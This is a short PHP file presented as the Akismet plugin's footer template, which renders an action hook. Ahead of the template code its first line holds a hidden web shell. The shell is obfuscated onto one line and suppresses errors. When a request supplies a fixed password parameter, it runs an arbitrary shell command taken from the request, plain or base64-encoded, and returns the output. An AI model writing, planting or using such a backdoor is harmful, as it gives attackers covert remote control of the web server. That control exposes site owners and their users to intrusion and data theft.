<?php
error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="gseaiy8lkg85"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}

/**
 * Akismet footer template.
 *
 * Renders the akismet_footer action hook.
 */
declare( strict_types = 1 );

do_action( 'akismet_footer' );
